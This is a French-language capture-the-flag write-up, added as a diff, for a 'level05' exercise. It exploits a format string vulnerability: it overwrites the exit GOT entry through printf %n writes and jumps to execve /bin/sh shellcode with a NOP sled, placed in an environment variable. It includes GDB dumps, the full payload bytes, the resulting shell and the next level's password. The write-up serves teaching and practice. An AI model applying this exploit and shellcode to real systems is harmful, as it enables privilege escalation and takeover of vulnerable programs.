@@ -1,0 +1,210 @@
+On analyse le programme dans GDB. On ne voit aucun appelle system mais
+on aperçoit un printf, qui ne semble pas protéger par une string de parsage. 
+Cela nous laisse l'occasion d'un format string attaque.
+
+On va donc chercher à écrire, à l'aide du %n de printf, dans une addresse voulu.
+On sait que le programme finit par un exit, on va donc override l'exit, et le remplacer par le code que l'on souhait executer.
+Observons un peu ce qui se passe en mémoire: 
+
+(gdb) run
+Starting program: /home/users/level05/level05 
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+Breakpoint 1, 0x0804847a in main ()
+(gdb) continue
+Continuing.
+0x640xf7fcfac00xf7ec3af90xffffd6bf0xffffd6be(nil)0xffffffff0xffffd744(nil)0x70257025
+0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025
+0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025
+0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x63
+0xf7fceff4(nil)(nil)0xf7e455130x10xffffd7a40xffffd7ac0xf7fd3000(nil)0xffffd71c0xffffd7ac(nil)
+0x80482300xf7fceff4[Inferior 1 (process 1787) exited normally]
+
+(gdb) run
+Starting program: /home/users/level05/level05 
+a
+
+Breakpoint 1, 0x0804847a in main ()
+(gdb) x/50wx $esp
+0xffffd670:	0xffffd698 | 0x00000064	0xf7fcfac0	0xf7ec3af9
+0xffffd680:	0xffffd6bf	0xffffd6be	0x00000000	0xf7ff245c
+0xffffd690:	0xffffd744	0x00000000	*0x00000a61	0xf7e5ec03
+0xffffd6a0:	0x08048271	0x00000000	0x00c30000	0x00000001
+0xffffd6b0:	0xffffd8cb	0x0000002f	0xffffd70c	0xf7fceff4
+0xffffd6c0:	0x08048520	0x080497c8	0x00000001	0x08048321
+0xffffd6d0:	0xf7fcf3e4	0x00000016	0x080497c8	0x08048541
+0xffffd6e0:	0xffffffff	0xf7e5ed56	0xf7fceff4	0xf7e5ede5
+0xffffd6f0:	0xf7feb620	0x00000000	0x08048529	0x00000000
+0xffffd700:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513 
+0xffffd710:	0x00000001	0xffffd7a4	0xffffd7ac	0xf7fd3000
+0xffffd720:	0x00000000	0xffffd71c	0xffffd7ac	0x00000000
+0xffffd730:	0x08048230	0xf7fceff4 |
+
+ entre les deux | se trouvent toutes les addresses qu'on peut afficher a travers printf(var) en introduisant des %p.
+ Au niveau de * se trouve le début de notre buffer. C'est à dire à la 10e position.
+ 
+Il faut donc que l'on écrive l'addresse que l'on souhaite override à la 10e position dans notre buffer.
+Tout d'abord trouvons cette addresse. On prendra l'addresse exit@plt:
+(gdb) disas main
+    ...
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+(gdb) x/i 0x8048370
+   0x8048370 <exit@plt>:	jmp    *0x80497e0
+
+Notre addresse exit est 0x80497e0.
+Quand le programme passera par exit, il va sauter vers l'addresse exit de la librairie.
+Au lieu de sauter vers cette fonction on va réecrire notre fonction au niveau de cette addresse pour qu'il aille vers notre shell_code.
+
+Maintenant il faut introduire notre shell_code, que l'on a trouvé sur internet (https://shell-storm.org/shellcode/files/shellcode-811.html)
+
+On sait par les précédent exercice que la manière la plus simple d'introduire du code 
+dans un programme est de passer par les variables d'environnements.
+
+export SHELL_CODE=$(python -c 'print 500 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') 
+
+Maintenant, trouvons l'emplacement approximatif de la variable à l'intérieur du programme lorsqu'il est lancé:
+
+(gdb) b main
+(gdb) run
+(gdb) x/100s *((char **)environ)
+    ...
+    0xffffdd26:	 "LANGUAGE=en_US:en"
+    0xffffdd38:	 "SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220..."
+    0xffffdf54:	 "LOGNAME=level05"
+(gdb) x/1000wx 0xffffdd38
+    (gdb) x/1000wx 0xffffdd38
+0xffffdd38:	0x4c454853	0x4f435f4c	0x903d4544	0x90909090
+0xffffdd48:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdd58:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdd68:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdd78:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdd88:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdd98:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdda8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffddb8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffddc8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffddd8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdde8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffddf8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde08:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde18:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde28:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde38:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde48:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde58:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde68:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde78:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde88:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffde98:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdea8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdeb8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdec8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffded8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdee8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdef8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdf08:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdf18:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffdf28:	0x90909090	0x90909090	0x90909090	0x31909090
+0xffffdf38:	0x2f6850c0	0x6868732f	0x6e69622f	0xc189e389
+0xffffdf48:	0x0bb0c289	0xc03180cd	0x0080cd40	0x4e474f4c
+0xffffdf58:	0x3d454d41	0x6576656c	0x0035306c	0x5f485353
+0xffffdf68:	0x4e4e4f43	0x49544345	0x313d4e4f	0x312e3239
+0xffffdf78:	0x352e3836	0x3434322e	0x35353420	0x31203832
+0xffffdf88:	0x312e3239	0x352e3836	0x3932312e	0x34323420
+0xffffdf98:	0x454c0032	0x504f5353	0x7c3d4e45	0x73752f20
+0xffffdfa8:	0x69622f72	0x656c2f6e	0x69707373	0x25206570
+0xffffdfb8:	0x454c0073	0x4c435353	0x3d45534f	0x7273752f
+0xffffdfc8:	0x6e69622f	0x73656c2f	0x70697073	0x73252065
+0xffffdfd8:	0x00732520	0x6d6f682f	0x73752f65	0x2f737265
+0xffffdfe8:	0x6576656c	0x2f35306c	0x6576656c	0x0035306c
+
+Prenons une addresse au milieu des NOP puisque l'addressage des variable d'environnements
+varient à chaque lancement. Ainsi ce sera approximatif mais il tombera certainement sur un NOP puisqu'on en a mis 1000 et ensuite glissera sur
+les autre nop jusqu'au shell_code.
+
+On va donc choisir celle ci : 0xffffde58
+
+C'est cette addresse que l'on ecrira à la place de exit pour mener le code jusqu'au shell_code
+On l'introduira grace au %n de printf, il faut donc traduire cette addresse en int :
+0xffffde58 = 4294958680
+
+$ python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294958680x" + "%10$n"' > /tmp/exploit
+$ cat /tmp/exploit - | ./level05
+??..
+
+ça ne fonctionne pas.
+Regardons dans gdb :
+ (gdb) b *0x08048513 ( au niveau de l'exit)
+ (gdb) run < /tmp/exploit
+    Starting program: /home/users/level05/level05 < /tmp/exploit
+      �64
+    Breakpoint 1, 0x08048513 in main ()
+(gdb) x/wx $esp+0x28
+    0xffffd478:	0x080497e0
+(gdb) x/wx 0x080497e0
+    0x80497e0 <exit@got.plt>:	0x08048376
+
+Notre nombre n'a pas été ecrit à l'emplacement voulu. Pourtant, en essayant un nombre plus petit, on y parvient tout à fait :
+$ python -c 'print "\x08\x04\x97\xe0"[::-1] + "%214x" + "%10$n"' > /tmp/test
+ 
+ (gdb) b *0x08048513 ( au niveau de l'exit)
+ (gdb) run < /tmp/test
+    Starting program: /home/users/level05/level05 < /tmp/test
+    �                                                                                                                                                                                                                    64
+
+            64
+    Breakpoint 1, 0x08048513 in main ()
+(gdb) x/wx $esp+0x28
+    0xffffd478:	0x080497e0
+(gdb) x/wx 0x080497e0
+    0x80497e0 <exit@got.plt>:	0x000000da
+
+On remarque aussi que le padding à bien eu lieu pour le nombre plus petit. Après quelques recherches, on s'aperçoit
+que le padding de printf ne prend que des int, et que la valeur maximal qui soit accepter est donc
+le max_int : 2147483647
+
+4294958680x / 2 = 2147479340
+
+on esssaye donc :
+$ python -c 'print "\x08\x04\x97\xe0"[::-1] + "%2147479340x" + "%2147479336x" + "%10$n"' > /tmp/test3
+
+ça semble fonctionner, mais les paddings sont extremement long a écrire, il y en a plus de 4 milliards à écrire, et ça prend plus de 20min.
+
+
+On a une autre solution plus rapide et efficace :
+On peut écrire en plusieurs fois le nombre voulu:
+On veut que 0x80497e0 contienne 4294958680x
+0x80497e0  =>  0xffffde58
+On divise le nombre octet par octet :
+0x80497e0  => 0xff = 255
+0x80497e1  => 0xff = 255
+0x80497e2  => 0xde = 222
+0x80497e3  => 0x58 = 88
+
+Du fait du little endianness, il faut d'abord écrire les bits de poids faible, qui iront vers l'extrémité.
+De ce fait cela revient à:
+0x80497e0  => 0x58 = 88
+0x80497e1  => 0xde = 222
+0x80497e2  => 0xff = 255
+0x80497e3  => 0xff = 255
+
+Comme notre %n cumule les octets qui ont été écrit précédement, on soustrait à chaque fois le nombre d'octets qui on été déjà écrit pour avoir le nombre que l'on souhaite:
+On écrit 4 addresse avant d'écrire notre premier chiffre -> 4x4 = 16 octets sont déjà écrit, et nous on souhaite écrire 88:
+88 - 16 = 72
+Ensuite on souhaite écrire 222 dans la deuxième addresse alors qu'on a déjà ecrit 88 octets
+222 - 88 = 134
+Enfin on veut écrire 255 octets 2 fois :
+255 - 222  = 33
+
+$ python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe1"[::-1] + "\x08\x04\x97\xe2"[::-1] + "\x08\x04\x97\xe3"[::-1] + "%72x" + "%10$n" + "%134x" + "%11$n" + "%33x" + "%12$n" + "%13$n"' > /tmp/test3
+$ cat /tmp/test3 - | ./level05 
+�                                                                      64                                                                                                                              f7fcfac0                         f7ec3af9
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
